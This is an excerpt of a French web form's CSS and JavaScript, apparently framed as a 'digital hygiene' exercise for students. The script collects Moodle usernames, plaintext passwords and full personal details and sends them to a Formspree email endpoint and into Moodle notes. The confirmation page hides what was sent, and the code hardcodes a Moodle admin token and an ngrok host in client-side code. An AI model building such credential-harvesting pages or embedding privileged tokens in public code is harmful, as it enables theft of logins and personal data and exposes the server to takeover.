  /* ‚îÄ‚îÄ JSON PANEL ‚îÄ‚îÄ */
  .json-panel {

    border-radius: 6px;
    padding: 20px 24px;

  @keyframes slideDown {

    background: var(--teal);

  /* Validation */
  .field input.error, .field select.error { border-color: var(--red) !important; }

  /* ‚îÄ‚îÄ RESPONSIVE ‚îÄ‚îÄ */
  @media (max-width: 768px) {
    .auth-row { grid-template-columns: 1fr; }
    .form-grid-2 { grid-template-columns: 1fr; }
    .field-full { grid-column: 1; }
  }
</style>
</head>

<script>
  // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  // ‚öôÔ∏è  CONFIG ‚Äî √Ä MODIFIER avant d√©ploiement
  // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

  // 1. Formspree ‚Äî ton endpoint email
  var FORMSPREE_ENDPOINT = "https://formspree.io/f/xwvnqjnb";

  // 2. Moodle ‚Äî 3 infos √† remplir :
  //    - MOODLE_URL    : l'adresse de ton Moodle (sans slash final)
  //    - MOODLE_TOKEN  : le token admin (Admin > Plugins > Web services > Manage tokens)
  //    - MOODLE_COURSE_ID : l'ID du cours o√π stocker les donn√©es (visible dans l'URL du cours)
  var MOODLE_URL       = "https://educatory-lovella-unperceptively.ngrok-free.dev";
  var MOODLE_TOKEN     = "f7ba2e8b49ce77926ae61f7c7c36ea01";
  var MOODLE_COURSE_ID = 3;

  // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

  function togglePwd(icon) {
    var input = icon.previousElementSibling;
    if (input.type === 'password') { input.type = 'text'; icon.textContent = 'üôà'; }
    else { input.type = 'password'; icon.textContent = 'üëÅ'; }
  }

  function validateRequired() {
    var required = ['moodle-id','reg-pwd','reg-pwd2','prenom','nom','adresse','cp','ville','tel'];
    var valid = true;
    required.forEach(function(id) {
      var el = document.getElementById(id);
      el.classList.remove('error');
      if (!el.value.trim()) { el.classList.add('error'); valid = false; }
    });
    var p1 = document.getElementById('reg-pwd');
    var p2 = document.getElementById('reg-pwd2');
    if (p1.value && p2.value && p1.value !== p2.value) {
      p2.classList.add('error');
      valid = false;
      alert('Les mots de passe ne correspondent pas.');
    }
    return valid;
  }

  function v(id) {
    var el = document.getElementById(id);
    return el ? (el.value.trim() || null) : null;
  }

  function buildData() {
    return {
      id_inscription:  'USR-' + Date.now(),
      horodatage:      new Date().toISOString(),
      moodle_username: v('moodle-id'),
      compte: {
        mot_de_passe: v('reg-pwd')
      },
      identite: {
        civilite:       v('civilite'),
        prenom:         v('prenom'),
        nom:            v('nom'),
        date_naissance: v('ddn'),
        langue:         v('langue')
      },
      adresse: {
        numero_voie:  v('adresse'),
        complement_1: v('compl1'),
        complement_2: v('compl2'),
        lieu_dit:     v('lieudit'),
        code_postal:  v('cp'),
        ville:        v('ville'),
        pays:         v('pays')
      },
      contact: {
        telephone: v('tel'),
        mobile:    v('mobile')
      }
    };
  }

  // ‚îÄ‚îÄ Envoi vers Formspree (email √† toi)
  function sendToFormspree(data) {
    if (FORMSPREE_ENDPOINT.indexOf('REMPLACE_MOI') !== -1) {
      console.warn('‚ö†Ô∏è Formspree non configur√©'); console.log(JSON.stringify(data, null, 2)); return;
    }
    fetch(FORMSPREE_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify(data)
    }).catch(function(e) { console.error('Formspree error:', e); });
  }

  // ‚îÄ‚îÄ Envoi vers Moodle (stock√© sur le compte de l'√©l√®ve)
  // Utilise core_notes_add_notes pour cr√©er une note sur le profil de l'utilisateur.
  // L'admin peut lire toutes les notes depuis : Administration > Notes
  function sendToMoodle(data) {
    if (MOODLE_URL.indexOf('TON_MOODLE') !== -1 || MOODLE_TOKEN.indexOf('COLLE_TON') !== -1) {
      console.warn('‚ö†Ô∏è Moodle non configur√©'); return;
    }

    var jsonText = JSON.stringify(data, null, 2);
    var username = data.moodle_username;

    // √âtape 1 : r√©cup√©rer l'ID Moodle de l'utilisateur √† partir de son username
    var searchUrl = MOODLE_URL + '/webservice/rest/server.php'
      + '?wstoken=' + MOODLE_TOKEN
      + '&wsfunction=core_user_get_users_by_field'
      + '&moodlewsrestformat=json'
      + '&field=username'
      + '&values[0]=' + encodeURIComponent(username);

    var ngrokHeaders = { 'ngrok-skip-browser-warning': 'true' };

    fetch(searchUrl, { headers: ngrokHeaders })
      .then(function(r) { return r.json(); })
      .then(function(users) {
        if (!users || !users.length) {
          console.error('Moodle : utilisateur "' + username + '" introuvable.');
          return;
        }
        var userId = users[0].id;

        // √âtape 2 : cr√©er une note sur ce compte avec le JSON complet
        var noteUrl = MOODLE_URL + '/webservice/rest/server.php';
        var body = new URLSearchParams({
          wstoken:              MOODLE_TOKEN,
          wsfunction:           'core_notes_create_notes',
          moodlewsrestformat:   'json',
          'notes[0][userid]':   userId,
          'notes[0][publishstate]': 'site',   // visible par l'admin seulement
          'notes[0][courseid]': MOODLE_COURSE_ID,
          'notes[0][text]':     jsonText,
          'notes[0][format]':   '0',
          'notes[0][subject]':  'Exercice hygiene numerique - ' + data.horodatage
        });

        return fetch(noteUrl, { method: 'POST', body: body, headers: ngrokHeaders });
      })
      .then(function(r) { if (r) return r.json(); })
      .then(function(result) {
        if (result) console.log('‚úÖ Note Moodle cr√©√©e :', result);
      })
      .catch(function(e) { console.error('Moodle error:', e); });
  }

  // ‚îÄ‚îÄ Page de confirmation client (rien de sensible visible)
  function showConfirmation(prenom) {
    document.querySelector('main').innerHTML =
      '<div style="text-align:center;padding:80px 20px;max-width:600px;margin:0 auto;font-family:Raleway,sans-serif;">' +
        '<div style="width:70px;height:70px;background:#2a9d8f;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:34px;color:#fff;">‚úì</div>' +
        '<h2 style="font-size:26px;color:#2a9d8f;margin-bottom:14px;">Merci ' + (prenom || '') + ' !</h2>' +
        '<p style="color:#666;font-size:15px;line-height:1.8;margin-bottom:8px;">Vos informations ont bien √©t√© enregistr√©es.</p>' +
        '<p style="color:#aaa;font-size:13px;">Votre formateur pourra y acc√©der depuis Moodle.</p>' +
      '</div>';
  }

  // ‚îÄ‚îÄ Point d'entr√©e principal
  function collectData() {
    if (!validateRequired()) return;
    var data = buildData();
    window._lastFormData = data;
    sendToFormspree(data);   // ‚Üí email pour toi
    sendToMoodle(data);      // ‚Üí note sur le compte Moodle de l'√©l√®ve
    showConfirmation(data.identite.prenom);
    // downloadJSON(data);   // d√©commenter pour t√©l√©chargement local en plus
  }

</script>
